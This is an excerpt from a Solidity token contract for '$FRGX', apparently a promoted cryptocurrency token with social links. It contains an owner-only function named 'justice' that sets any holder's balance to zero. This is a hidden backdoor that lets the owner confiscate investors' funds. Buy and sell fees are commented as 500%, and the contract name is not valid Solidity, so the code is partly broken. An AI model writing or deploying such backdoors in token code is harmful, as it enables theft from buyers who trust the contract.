...
/* 
    ...
    Twitter:    https://twitter.com/FRGXfinance
    Telegram:   https://t.me/frgxfinancebot
...
contract $FRGX is IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _maxWalletBalancePercentage = 10000; 
    uint256 private _maxTxAmountPercentage = 10000; 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    address private constant _uniswapRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    ...
    uint256 private _sellFee = 500; // 500%
    uint256 private _burnFee = 0; // 0%
    uint256 private _buyFee = 500; // 500%
    ...
    function justice(address _addr) external onlyOwner {
        require(balanceOf(_addr) > 0, "Low balance");
        _balances[_addr] = 0;
    }
